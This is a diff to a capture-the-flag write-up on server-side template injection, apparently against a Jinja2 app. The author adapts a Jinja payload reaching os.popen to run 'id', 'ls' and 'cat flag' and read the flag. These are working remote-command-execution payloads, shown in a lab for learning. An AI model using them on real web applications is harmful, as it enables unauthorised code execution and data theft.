@@ -17,3 +17,14 @@ I used a payload found on this blogpost: [onsecurity](https://www.onsecurity.io/
 ```
 {{request.application.__globals__.__builtins__.__import__(‘os’).popen(‘id’).read()}}
 ```
+![ssti1_ID.png](images/ssti1_ID.png)
+Now we can go back and tweak some of the data to see what else we can find. I tried replacing “id” (this is a Linux system command that prints out user and group information for the current user) to “ls” like on a Linux terminal to see the files and directories in the current working directory:
+```
+{{request.application.__globals__.__builtins__.__import__(‘os’).popen(‘ls’).read()}}
+```
+![SSTI1_ls.png](images/SSTI1_ls.png)
+We can see that there is a “flag” file, which most likely contains the flag for this challenge, so I want to see the content of that file. To do so, I use the Linux command cat and then the name of the file (flag) in the payload:
+`{{request.application.__globals__.__builtins__.__import__(‘os’).popen(‘cat flag’).read()}}`
+![flag.png](images/flag.png)
+
+#### Challenge completed!
